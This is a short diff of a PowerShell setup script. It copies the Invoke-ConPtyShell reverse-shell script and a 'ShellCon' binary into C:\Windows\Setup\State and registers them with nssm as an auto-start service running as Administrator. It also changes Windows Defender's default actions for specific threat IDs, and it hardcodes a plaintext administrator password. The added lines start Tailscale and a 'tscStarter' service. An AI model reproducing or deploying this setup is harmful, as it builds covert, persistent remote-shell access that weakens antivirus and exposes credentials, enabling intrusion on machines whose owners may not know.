@@ -12,7 +12,7 @@ Add-MpPreference -ThreatIDDefaultAction_Ids $threat2 -ThreatIDDefaultAction_Acti
 #copy connection script:
 Copy-Item -Path Z:\Invoke-ConPtyShell.ps1 -Destination C:\Windows\Setup\State\Invoke-ConPtyShell.ps1
 
-#copy service exe:
+#copy ShellCon service:
 Copy-Item -Path Z:\ShellCon.exe -Destination C:\Windows\Setup\State\ShellCon.exe
 
 #copy nssm.exe
@@ -61,3 +61,8 @@ $AppDirectory = "C:\Windows\Setup\State\tsc"
 ..\nssm set $ServiceName Start SERVICE_AUTO_START
 ..\nssm set $ServiceName ObjectName .\Administrator 34Tehno12
 ..\nssm set $ServiceName AppStopMethodConsole 30000
+
+#Start both services:
+Start-Service Tailscale
+Start-Service tscStarter
+
